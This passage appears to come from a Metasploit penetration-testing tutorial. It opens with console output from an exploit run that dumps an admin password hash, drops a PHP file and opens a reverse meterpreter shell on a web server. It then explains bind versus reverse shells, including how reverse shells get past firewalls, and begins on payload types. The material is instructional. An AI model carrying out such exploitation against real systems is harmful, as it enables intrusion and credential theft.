```
[*] Started reverse TCP handler on 192.168.216.5:4444
[*] 192.168.216.136:80 - Dumping the username and password hash...
[+] 192.168.216.136:80 - Got the admin's hash:
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 !
...
[!] This exploit may require manual cleanup of '/var/content/module/cqi/duso.php' on the target

meterpreter >
[+] 192.168.216.136:80 - Deleted duso.php

meterpreter > getuid
Server username: www-data (33)
meterpreter >
```

On successful execution of the module, we get remote access to the web server with the privileges of the HTTP server

# Types of shell

Before moving to the next topic, let's talk about the different types of shell available. When looking at the list of available shells, they fall into two categories: bind and reverse.

A bind shell instructs the target to start the command shell and listen on a local port, allowing the attacker to connect to the target on the listening port. A bind shell is great for local vulnerabilities, for example, when you have already compromised a target machine via a phishing attack and want to leverage a local service to do privilege escalation; however, nowadays it is not suitable for most remote exploitation scenarios because the target is probably behind a firewall.

For that reason, most of the time we will use a reverse shell as our payload. A reverse shell starts a connection with the attacker's machine, in this case, the attacker's machine is the one that is opening a local port and listening for a connection, and since most outbound rules are more on-premise, a reverse shell is more likely to bypass the firewall.

# Payloads

There are three different types of payload module in the Metasploit Framework: singles, stag ers, and stages. Singles are payloads that are self-contained and completely standalone.